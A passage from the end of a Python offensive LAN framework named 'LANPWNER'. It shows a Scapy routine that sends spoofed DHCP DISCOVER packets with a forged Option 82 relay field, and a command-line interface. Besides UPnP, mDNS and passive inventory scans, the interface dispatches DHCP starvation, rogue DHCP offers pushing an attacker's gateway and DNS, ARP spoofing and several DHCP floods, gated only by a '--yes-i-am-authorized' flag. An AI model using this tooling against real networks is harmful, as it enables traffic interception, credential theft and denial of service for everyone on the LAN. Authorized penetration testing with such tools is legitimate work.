        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2bytes(mac))/DHCP(options=[("message-type","discover"), (82, b'FAKE-RELAY-AGENT'), ("end")])
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent DHCP DISCOVER with Option 82 from {mac}")
    print(f'[*] Sent {count} DHCP DISCOVER packets with Option 82 spoofing.')

def main():
    print(LEGAL_DISCLAIMER)
    parser = argparse.ArgumentParser(description="LANPWNER Offensive LAN Framework")
    subparsers = parser.add_subparsers(dest='command', required=True)

    # UPnP subcommand
    upnp_parser = subparsers.add_parser('upnp', help='Run UPnP discovery and enumeration')
    upnp_parser.add_argument('--report', type=str, help='Save findings to a report file (HTML or JSON)')
    upnp_parser.add_argument('--format', type=str, choices=['html', 'json'], default='html', help='Report format')
    upnp_parser.add_argument('--timeout', type=int, default=5, help='Discovery timeout (seconds)')
    upnp_parser.add_argument('--max-devices', type=int, default=50, help='Maximum devices to enumerate')
    upnp_parser.add_argument('--interface', type=str, help='Network interface to use for discovery (requires netifaces, may not work on all platforms)')
    upnp_parser.add_argument('--listen-extra', type=int, default=2, help='Extra seconds to listen for NOTIFY/SSDP packets after active scan')
    upnp_parser.add_argument('--debug', action='store_true', help='Enable debug output (raw SSDP/NOTIFY packets, verbose info)')

    # Bonjour/mDNS subcommand
    bonjour_parser = subparsers.add_parser('bonjour', help='Run Bonjour/mDNS enumeration (AirPlay, Chromecast)')
    bonjour_parser.add_argument('--report', type=str, help='Save findings to a report file (HTML or JSON)')
    bonjour_parser.add_argument('--format', type=str, choices=['html', 'json'], default='html', help='Report format')
    bonjour_parser.add_argument('--timeout', type=int, default=5, help='Discovery timeout (seconds)')

    # Sniff subcommand
    sniff_parser = subparsers.add_parser('sniff', help='Sniff the interface to detect active LAN protocols and enumerate them')
    sniff_parser.add_argument('--interface', type=str, required=True, help='Network interface to sniff')
    sniff_parser.add_argument('--timeout', type=int, default=10, help='Sniffing duration (seconds)')
    sniff_parser.add_argument('--report', type=str, help='Save findings to a report file (HTML or JSON)')
    sniff_parser.add_argument('--format', type=str, choices=['html', 'json'], default='html', help='Report format')
    sniff_parser.add_argument('--debug', action='store_true', help='Enable debug output')

    # Add inventory command
    inventory_parser = subparsers.add_parser('inventory', help='Build a passive DHCP/ARP host inventory')
    inventory_parser.add_argument('--interface', type=str, required=True, help='Network interface to sniff')
    inventory_parser.add_argument('--timeout', type=int, default=30, help='Sniffing duration (seconds)')
    inventory_parser.add_argument('--report', type=str, help='Save inventory to a report file (HTML or JSON)')
    inventory_parser.add_argument('--format', type=str, choices=['html', 'json'], default='html', help='Report format')
    inventory_parser.add_argument('--debug', action='store_true', help='Enable debug output')

    # Add attack command
    attack_parser = subparsers.add_parser('attack', help='Run network attacks (authorized testing only)')
    attack_parser.add_argument('--interface', type=str, required=True, help='Network interface to use')
    attack_parser.add_argument('--type', type=str, choices=[
        'dhcp-starvation', 'dhcp-spoof', 'arp-spoof',
        'dhcp-inform-flood', 'dhcp-option-overload', 'dhcp-leasequery', 'dhcp-decline-flood', 'dhcp-release-flood', 'dhcp-relay-spoof'], required=True, help='Attack type')
    attack_parser.add_argument('--count', type=int, default=100, help='Number of packets (for applicable attacks)')
    attack_parser.add_argument('--target-ip', type=str, help='Target IP for ARP spoofing')
    attack_parser.add_argument('--spoof-ip', type=str, help='IP to spoof for ARP spoofing')
    attack_parser.add_argument('--pool-start', type=str, help='Start of IP pool for DHCP spoofing')
    attack_parser.add_argument('--pool-end', type=str, help='End of IP pool for DHCP spoofing')
    attack_parser.add_argument('--gateway', type=str, help='Gateway IP to offer in DHCP spoofing')
    attack_parser.add_argument('--dns', type=str, help='DNS server IP to offer in DHCP spoofing')
    attack_parser.add_argument('--lease-time', type=int, default=3600, help='Lease time for DHCP spoofing')
    attack_parser.add_argument('--debug', action='store_true', help='Enable debug output')
    attack_parser.add_argument('--yes-i-am-authorized', action='store_true', help='Confirm you are authorized to run attacks')

    args = parser.parse_args()

    if args.command == 'upnp':
        try:
            upnp = UPnPModule(timeout=args.timeout, max_devices=args.max_devices, interface=args.interface, listen_extra=args.listen_extra, debug=args.debug)
            print('[*] Discovering UPnP devices...')
            devices = upnp.discover()
            print(f'[*] Found {len(devices)} device(s). Enumerating...')
            report = ReportGenerator()
            for dev in devices:
                info = upnp.enumerate(dev)
                if 'error' not in info:
                    findings = upnp.check_misconfigurations(info)
                    for finding in findings:
                        print(f"[!] {finding['title']} on {finding['device']} ({finding.get('severity','')})")
                        print(f"    {finding['description']}")
                    report.add_discovery(info)
                    for finding in findings:
                        report.add_vulnerability(finding)
                else:
                    print(f"[!] Error enumerating {dev.get('location')}: {info['error']}")
            if args.report:
                report_path = ensure_reports_dir(args.report)
                print(f'[*] Saving report to {report_path} ({args.format})...')
                report.generate(format=args.format, save_path=report_path)
                print('[*] Report saved.')
            else:
                print('[*] No report file specified. Use --report to save results.')
        except RuntimeError as e:
            print(f"[!] {e}", file=sys.stderr)
            sys.exit(1)

    elif args.command == 'bonjour':
        bonjour = BonjourModule(timeout=args.timeout)
        print('[*] Discovering Bonjour/mDNS (AirPlay, Chromecast) devices...')
        services = bonjour.discover()
        print(f'[*] Found {len(services)} service(s).')
        report = ReportGenerator()
        for svc in services:
            findings = bonjour.check_misconfigurations(svc)
            for finding in findings:
                print(f"[!] {finding['title']} on {finding['device']} ({finding.get('severity','')})")
                print(f"    {finding['description']}")
            report.add_discovery(svc)
            for finding in findings:
                report.add_vulnerability(finding)
        if args.report:
            report_path = ensure_reports_dir(args.report)
            print(f'[*] Saving report to {report_path} ({args.format})...')
            report.generate(format=args.format, save_path=report_path)
            print('[*] Report saved.')
        else:
            print('[*] No report file specified. Use --report to save results.')

    elif args.command == 'sniff':
        detected = sniff_protocols(args.interface, timeout=args.timeout, debug=args.debug)
        report = ReportGenerator()
        # Based on detected protocols, enumerate
        if 'upnp' in detected:
            print('[*] Enumerating UPnP devices...')
            upnp = UPnPModule(interface=args.interface, debug=args.debug)
            devices = upnp.discover()
            for dev in devices:
                info = upnp.enumerate(dev)
                if 'error' not in info:
                    findings = upnp.check_misconfigurations(info)
                    for finding in findings:
                        print(f"[!] {finding['title']} on {finding['device']} ({finding.get('severity','')})")
                        print(f"    {finding['description']}")
                    report.add_discovery(info)
                    for finding in findings:
                        report.add_vulnerability(finding)
        if 'bonjour' in detected:
            print('[*] Enumerating Bonjour/mDNS (AirPlay, Chromecast) devices...')
            bonjour = BonjourModule()
            services = bonjour.discover()
            for svc in services:
                findings = bonjour.check_misconfigurations(svc)
                for finding in findings:
                    print(f"[!] {finding['title']} on {finding['device']} ({finding.get('severity','')})")
                    print(f"    {finding['description']}")
                report.add_discovery(svc)
                for finding in findings:
                    report.add_vulnerability(finding)
        # Add detected media/bluetooth devices from passive sniffing
        for dev in sniff_protocols.detected_devices:
            report.add_discovery(dev)
        if args.report:
            report_path = ensure_reports_dir(args.report)
            print(f'[*] Saving report to {report_path} ({args.format})...')
            report.generate(format=args.format, save_path=report_path)
            print('[*] Report saved.')
        else:
            print('[*] No report file specified. Use --report to save results.')

    elif args.command == 'inventory':
        inventory = build_host_inventory(args.interface, timeout=args.timeout, debug=args.debug)
        report = ReportGenerator()
        for host in inventory:
            report.add_discovery(host)
        if args.report:
            report_path = ensure_reports_dir(args.report)
            print(f'[*] Saving report to {report_path} ({args.format})...')
            report.generate(format=args.format, save_path=report_path)
            print('[*] Report saved.')
        else:
            print('[*] No report file specified. Use --report to save results.')

    elif args.command == 'attack':
        if not args.yes_i_am_authorized:
            print('[!] You must pass --yes-i-am-authorized to run attack modules. These are for authorized testing only!')
            sys.exit(1)
        if args.type == 'dhcp-starvation':
            dhcp_starvation_attack(args.interface, count=args.count, debug=args.debug)
        elif args.type == 'dhcp-spoof':
            if not (args.pool_start and args.pool_end and args.gateway and args.dns):
                print('[!] --pool-start, --pool-end, --gateway, and --dns are required for dhcp-spoof.')
                sys.exit(1)
            dhcp_spoof_attack(args.interface, pool_start=args.pool_start, pool_end=args.pool_end, gateway=args.gateway, dns=args.dns, lease_time=args.lease_time, debug=args.debug)
        elif args.type == 'arp-spoof':
            if not args.target_ip or not args.spoof_ip:
                print('[!] --target-ip and --spoof-ip are required for arp-spoof.')
                sys.exit(1)
            arp_spoof_attack(args.interface, target_ip=args.target_ip, spoof_ip=args.spoof_ip, count=args.count, debug=args.debug)
        elif args.type == 'dhcp-inform-flood':
            dhcp_inform_flood(args.interface, count=args.count, debug=args.debug)
        elif args.type == 'dhcp-option-overload':
            dhcp_option_overload(args.interface, count=args.count, debug=args.debug)
        elif args.type == 'dhcp-leasequery':
            dhcp_leasequery(args.interface, debug=args.debug)
        elif args.type == 'dhcp-decline-flood':
            dhcp_decline_flood(args.interface, count=args.count, debug=args.debug)
        elif args.type == 'dhcp-release-flood':
            dhcp_release_flood(args.interface, count=args.count, debug=args.debug)
        elif args.type == 'dhcp-relay-spoof':
            dhcp_relay_spoof(args.interface, count=args.count, debug=args.debug)
        else:
            print('[!] Unknown attack type.')
            sys.exit(1)

if __name__ == "__main__":
    main() 